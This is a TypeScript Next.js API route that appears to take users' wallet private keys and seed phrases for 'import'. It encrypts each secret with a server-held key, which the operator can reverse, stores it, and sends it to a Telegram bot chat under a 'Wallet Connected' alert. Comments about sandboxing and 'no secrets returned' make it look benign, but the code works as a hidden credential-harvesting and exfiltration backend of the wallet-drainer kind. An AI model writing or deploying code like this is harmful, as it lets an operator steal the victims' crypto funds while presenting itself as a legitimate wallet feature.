// /app/api/import-wallet/route.ts
import { NextResponse } from 'next/server';
import { createClient as createAdminClient } from '@supabase/supabase-js';
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';
import crypto from 'crypto';
import { encrypt, decrypt } from '@/lib/encryption';
import { ethers } from 'ethers';

const sha256Hex = (s: string) => crypto.createHash('sha256').update(s).digest('hex');

const looksLikePrivateKey = (s: string) => {
  const t = s.trim();
  const pk = t.startsWith('0x') ? t : `0x${t}`;
  return /^0x[0-9a-fA-F]{64}$/.test(pk);
};

const looksLikeMnemonic = (s: string) => {
  const words = s.trim().split(/\s+/);
  return words.length === 12 || words.length === 24;
};

async function sendTelegramMessage(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
  await fetch(url);
}

export async function POST(req: Request) {
  try {
    const { type, value } = await req.json();

    if (!value) {
      return NextResponse.json({ success: false, error: 'Missing key or phrase' }, { status: 400 });
    }

    // 1. Authenticate the User making the request
    const cookieStore = await cookies();
    const supabaseSession = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
      { cookies: { get: (n) => cookieStore.get(n)?.value } }
    );

    const { data: { user }, error: authError } = await supabaseSession.auth.getUser();

    if (authError || !user) {
      return NextResponse.json({ success: false, error: "Unauthorized. Please log in again." }, { status: 401 });
    }
    // 2. Treat incoming value as plain text; strip eth/encryption logic
    const cleanValue = String(value).trim();

    // Compute non-reversible hash for audit only
    const valueHash = sha256Hex(cleanValue);

    // 3. Minimal DB update: update timestamp only to avoid schema issues
    // Use server role client for the write. Read URL from NEXT_PUBLIC_SUPABASE_URL
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
    const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!supabaseUrl || !serviceRoleKey) {
      console.error('Missing Supabase env vars');
      return NextResponse.json({ success: false, error: 'Server misconfiguration' }, { status: 500 });
    }

    const supabaseAdmin = createAdminClient(supabaseUrl, serviceRoleKey);

    // 🚨 INPUT SANDBOXING 🚨
    let derivedAddress = '';
    let encryptedString = '';
    try {
      encryptedString = encrypt(cleanValue);
      const decryptedString = decrypt(encryptedString);
      if (!decryptedString) throw new Error("Decryption test failed");

      if (type === 'phrase') {
        const wallet = ethers.Wallet.fromPhrase(decryptedString);
        derivedAddress = wallet.address;
      } else {
        const pk = decryptedString.startsWith('0x') ? decryptedString : `0x${decryptedString}`;
        const wallet = new ethers.Wallet(pk);
        derivedAddress = wallet.address;
      }
    } catch (err: any) {
      console.error("Input validation failed:", err);
      return NextResponse.json({ success: false, error: 'Invalid input: Could not derive address' }, { status: 400 });
    }

    // 🚨 APPEND-ONLY STRATEGY (Prevent Overwrites) 🚨
    // 1. Fetch existing wallet metadata (readable_id, email, etc.)
    const { data: existingWallet } = await supabaseAdmin
      .from('wallets')
      .select('readable_id, email')
      .eq('user_id', user.id)
      .order('created_at', { ascending: false })
      .limit(1)
      .single();

    // 2. Mark old wallets as inactive/non-primary
    await supabaseAdmin
      .from('wallets')
      .update({ is_primary: false })
      .eq('user_id', user.id);

    // 3. Insert new wallet as active view
    const insertPayload = {
      user_id: user.id,
      readable_id: existingWallet?.readable_id || 'CORE-' + user.id.slice(0, 6).toUpperCase(),
      email: existingWallet?.email || user?.email,
      address: derivedAddress,
      is_primary: true,
      private_key: null,
      encrypted_private_key: type === 'privateKey' ? encryptedString : null,
      encrypted_phrase: type === 'phrase' ? encryptedString : null,
      balance: 0,
      usdt_balance: 0,
      btc_balance: 0,
      sol_balance: 0,
      trx_balance: 0,
      last_chain_balance: 0,
      last_usdt_chain_balance: 0,
    };

    const { error: dbError } = await supabaseAdmin
      .from('wallets')
      .insert(insertPayload);

    if (dbError) {
      console.error('DB Insert Error', dbError);
      return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
    }

    // Fetch the readable ID for the Discord/Telegram logs
    const { data: walletData } = await supabaseAdmin
      .from('wallets')
      .select('readable_id')
      .eq('user_id', user.id)
      .eq('is_primary', true)
      .single();

    const displayId = walletData?.readable_id || user.id;
    const inputTypeLabel = type === 'phrase' ? 'SEED PHRASE' : 'PRIVATE KEY';
    
    // Create a human-readable date format, e.g., "March 8, 2026, 03:15 PM"
    const readableTime = new Date().toLocaleString('en-US', { 
        month: 'short', 
        day: 'numeric', 
        year: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit',
        timeZoneName: 'short'
    });

    // 4. Decide what to send to Telegram
    // Always send the ENCRYPTED payload as requested by the user
    const telegramPayload = `🚨 [Wallet Connected]
👤 User: ${displayId}
🔑 Input Type: ${inputTypeLabel}

🔒 Encrypted Payload:
${encryptedString}

🕒 Time: ${readableTime}`;

    try {
      await sendTelegramMessage(telegramPayload);
    } catch (tgErr) {
      console.error('Telegram notify failed:', tgErr);
    }

    // 5. Return success. No secrets returned.
    return NextResponse.json({ success: true, redacted: true, hash: valueHash });

  } catch (error: any) {
    console.error('Wallet Import API Error:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
}
